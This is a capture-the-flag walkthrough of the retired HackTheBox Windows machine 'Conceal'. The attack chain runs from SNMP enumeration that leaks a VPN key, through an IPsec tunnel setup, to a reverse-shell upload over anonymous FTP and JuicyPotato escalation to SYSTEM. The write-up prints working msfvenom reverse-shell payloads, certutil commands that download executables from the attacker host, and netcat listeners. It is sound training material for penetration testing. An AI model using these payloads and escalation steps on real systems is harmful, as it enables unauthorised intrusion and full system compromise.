# HackTheBox — Conceal

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Windows  
**Category:** SNMP Enumeration / IPsec VPN / FTP Upload / Token Impersonation  
**Status:** Retired  

---

## Summary

Conceal is a Hard Windows box that requires enumerating SNMP to discover IPsec/IKE credentials, establishing a VPN tunnel to unlock additional services, uploading an ASP shell via anonymous FTP, and escalating via the JuicyPotato (SeImpersonatePrivilege) technique.

---

## Reconnaissance

### Nmap TCP (Initial — Mostly Filtered)

```bash
nmap -sC -sV -oA nmap/conceal_tcp 10.10.10.116
```

```
All ports filtered or closed.
```

Nothing useful on TCP — try UDP.

### Nmap UDP

```bash
nmap -sU --top-ports 200 -oA nmap/conceal_udp 10.10.10.116
```

```
PORT    STATE         SERVICE
161/udp open          snmp
500/udp open|filtered isakmp
```

- **SNMP on 161** — potential info leak
- **ISAKMP on 500** — IPsec key exchange (IKE)

---

## SNMP Enumeration

### Community String Brute-Force

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.116
```

```
10.10.10.116 [public] Hardware: ...
```

Community string: **public**

### Full SNMP Walk

```bash
snmpwalk -v1 -c public 10.10.10.116
```

Key findings from the output:

```
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 ... Windows 10 Enterprise"
iso.3.6.1.4.1.77.1.2.25.1.1 = STRING: "Destitute"   ← username
```

In the network interfaces section, an IKE pre-shared key often appears in extended OIDs:

```
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

**IKE PSK: 9C8B1A372B1878851BE2C097031B6E43**

---

## IPsec VPN Setup

The box requires an IPsec tunnel before TCP ports become accessible.

### Install strongSwan

```bash
apt install strongswan strongswan-pki libcharon-extra-plugins
```

### Configure /etc/ipsec.conf

```conf
config setup
    charondebug="all"
    uniqueids=yes

conn conceal
    type=transport
    keyexchange=ikev1
    right=10.10.10.116
    rightprotoport=tcp
    left=10.10.14.X
    leftprotoport=tcp
    authby=secret
    esp=aes128-sha1!
    ike=aes128-sha1-modp1024!
    ikelifetime=8h
    auto=start
```

### Configure /etc/ipsec.secrets

```
10.10.14.X 10.10.10.116 : PSK "9C8B1A372B1878851BE2C097031B6E43"
```

### Start the Tunnel

```bash
ipsec restart
ipsec status
```

Once the tunnel is up, TCP ports are accessible.

---

## Post-VPN Enumeration

```bash
nmap -sC -sV 10.10.10.116
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 10.0
```

### FTP — Anonymous Login

```bash
ftp 10.10.10.116
# anonymous / (blank)
```

The FTP root maps to the IIS web root (`C:\inetpub\wwwroot`).

---

## Exploitation

### Upload ASP Reverse Shell

```bash
# Generate an ASP shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f asp -o shell.asp
```

Upload via FTP:

```bash
ftp> put shell.asp
```

### Trigger the Shell

```bash
nc -lvnp 4444
curl http://10.10.10.116/shell.asp
```

Shell as **IIS APPPOOL\DefaultAppPool** / `conceal\Destitute`.

---

## User Flag

```cmd
type C:\Users\Destitute\Desktop\user.txt
```

---

## Privilege Escalation — JuicyPotato

### Check Privileges

```cmd
whoami /priv
```

```
SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
```

**SeImpersonatePrivilege is enabled** — classic JuicyPotato / PrintSpoofer scenario.

### JuicyPotato

```bash
# Transfer JuicyPotato.exe to target
certutil -urlcache -f http://10.10.14.X/JuicyPotato.exe C:\Temp\jp.exe

# Generate a reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=5555 -f exe -o rev.exe
certutil -urlcache -f http://10.10.14.X/rev.exe C:\Temp\rev.exe
```

Start a second listener:

```bash
nc -lvnp 5555
```

Execute:

```bash
# Try CLSID for Windows 10 Enterprise
C:\Temp\jp.exe -l 1337 -p C:\Temp\rev.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

Try multiple CLSIDs from the JuicyPotato CLSID list if the first fails.

**SYSTEM shell obtained.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **UDP scanning is essential** — many services (SNMP, IKE, DNS) only listen on UDP
- SNMP community strings can leak IKE pre-shared keys and usernames
- IPsec transport mode can gate access to TCP services — configure strongSwan to tunnel through
- FTP anonymous upload to the web root is an instant webshell path
- **SeImpersonatePrivilege** → JuicyPotato/PrintSpoofer → SYSTEM is one of the most common Windows privesc paths
- Always scan UDP when TCP yields nothing

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap -sU | UDP port scanning |
| onesixtyone | SNMP community string brute-force |
| snmpwalk | Full SNMP enumeration |
| strongSwan | IPsec VPN tunnel |
| msfvenom | Shell payload generation |
| ftp | Anonymous file upload |
| JuicyPotato | SeImpersonatePrivilege exploitation |
